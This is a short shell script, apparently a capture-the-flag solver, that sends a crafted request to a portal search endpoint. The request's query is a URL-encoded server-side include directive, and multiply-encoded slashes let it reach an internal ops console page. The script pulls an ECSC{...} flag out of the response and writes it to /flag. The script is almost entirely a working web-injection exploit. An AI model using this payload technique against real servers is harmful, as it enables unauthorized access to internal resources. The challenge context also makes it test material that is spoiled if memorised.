#!/bin/sh
set -u

: "${SESSION_ENDPOINT:?set SESSION_ENDPOINT=tls://host:port}"

endpoint=${SESSION_ENDPOINT#tls://}
host=${endpoint%%:*}
port=${endpoint#*:}

TARGET="https://${host}:${port}"
out=$(curl --path-as-is "${TARGET}//portal/search?q=%3C%21--%23include+virtual%3D%22/internal/docs/ops%25252fconsole%22+--%3E" 2>/tmp/exp.err)

flag=$(printf '%s\n' "$out" | grep -oE 'ECSC\{[^}]*\}' | head -1)
if [ -n "$flag" ]; then
    printf '%s\n' "$flag"
    printf '%s' "$flag" > /flag
    exit 0
else
    echo "no flag." >&2
    echo "--- exploit stdout ---" >&2
    printf '%s\n' "$out" >&2
    echo "--- exploit stderr ---" >&2
    cat /tmp/exp.err >&2
    exit 1
fi
